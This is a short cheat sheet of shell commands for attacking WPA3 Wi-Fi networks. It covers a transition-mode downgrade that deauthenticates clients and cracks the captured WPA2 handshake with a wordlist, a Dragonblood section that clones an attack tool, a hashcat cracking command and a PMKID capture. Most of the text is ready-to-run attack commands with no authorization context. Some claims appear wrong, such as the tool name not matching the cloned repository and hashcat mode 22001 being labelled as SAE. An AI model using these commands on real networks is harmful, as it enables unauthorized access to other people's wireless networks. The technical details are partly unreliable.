# WPA3 Attacks

WPA3 introduced SAE (Simultaneous Authentication of Equals) to replace PSK, but has vulnerabilities in transition mode.

## WPA3 Attack Methods

### Downgrade Attack (Transition Mode)
WPA3 Transition Mode allows WPA2 clients to connect, creating a downgrade path.

```bash
# 1. Scan for WPA3 Transition networks (show both WPA2+WPA3)
sudo airodump-ng wlan0mon
# Look for: encryption showing both "WPA3" and "WPA2"

# 2. Capture WPA2 handshake (client connecting via WPA2 fallback)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w transition_capture wlan0mon

# 3. Deauth to force WPA2 reconnection
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# 4. Crack the WPA2 handshake as usual
aircrack-ng -w /usr/share/wordlists/rockyou.txt transition_capture-01.cap
```

### Dragonblood Attack
WPA3's Dragonfly handshake has timing-based side-channel attacks (requires specialized tools).

```bash
# Use dragonslayer tool for WPA3 timing attack
git clone https://github.com/vanhoefm/dragondrain-and-time

# WPA3 SAE hashcat mode
hashcat -m 22001 sae_hash.txt /usr/share/wordlists/rockyou.txt
```

### WPA3 PMKID Attack
```bash
# Some WPA3 APs still expose PMKID in EAPOL frames
sudo hcxdumptool -i wlan0mon -o wpa3_capture.pcapng --enable_status=1
```

## WPA3 Detection
```bash
# Identify WPA3 networks
sudo airodump-ng wlan0mon
# WPA3 shows as: AKM: SAE in WPA, or "WPA3" in encryption field

# Use wifite with WPA3 filter
sudo wifite --wpa3
```
